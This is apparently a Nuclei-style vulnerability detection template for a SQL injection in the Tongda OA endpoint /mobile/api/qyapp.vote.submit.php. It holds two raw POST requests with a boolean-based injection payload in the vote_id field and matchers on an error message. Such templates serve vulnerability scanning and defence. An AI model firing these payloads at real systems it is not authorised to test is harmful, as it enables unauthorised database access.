id: poc-yaml-tongda-oa-submit-sqli
info:
  name: 通达OA qyapp.vote.submit.php接口存在SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
http:
  - raw:
      - |
        POST /mobile/api/qyapp.vote.submit.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        submitData={"a":{"vote_type":"1","vote_id":"if((select%20length((select%20123))=1),1,2*1e308)","value":"1"}}
    matchers-condition: or
    matchers:
      - type: word
        words:
          - "请联系管理员"
        part: body
      - type: regex
        regex:
          - "\\xE8\\xAF\\xB7\\xE8\\x81\\x94\\xE7\\xB3\\xBB\\xE7\\xAE\\xA1\\xE7\\x90\\x86\\xE5\\x91\\x98"
        part: body
  - raw:
      - |
        POST /mobile/api/qyapp.vote.submit.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        submitData={"a":{"vote_type":"1","vote_id":"if((select%20length((select%20123))=3),1,2*1e308)","value":"1"}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - ""
        part: body
